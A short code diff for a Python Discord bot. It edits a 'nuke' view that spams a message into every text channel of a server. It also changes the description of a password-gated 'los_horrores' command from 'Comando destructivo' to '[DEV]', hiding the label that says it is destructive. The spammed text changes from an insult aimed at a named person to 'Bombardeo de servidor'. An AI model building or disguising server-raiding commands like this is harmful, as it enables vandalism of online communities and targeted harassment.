@@ -30,7 +30,7 @@ class NukeConfirmView(discord.ui.View):
         guild = interaction.guild
         for channel in list(guild.text_channels):
             try:
-                await channel.send("🔴 **Miguel ijo corrupto** 🔴")
+                await channel.send("🔴 **Bombardeo de servidor** 🔴")
             except Exception:
                 pass
 
@@ -62,7 +62,7 @@ class Admin(commands.Cog, name="Admin"):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
-    @app_commands.command(name="los_horrores", description="[DEV] Comando destructivo")
+    @app_commands.command(name="los_horrores", description="[DEV]")
     @app_commands.describe(password="Contraseña")
     async def los_horrores(self, interaction: discord.Interaction, password: str) -> None:
         """Comando destructivo restringido al admin, con confirmación por botón."""
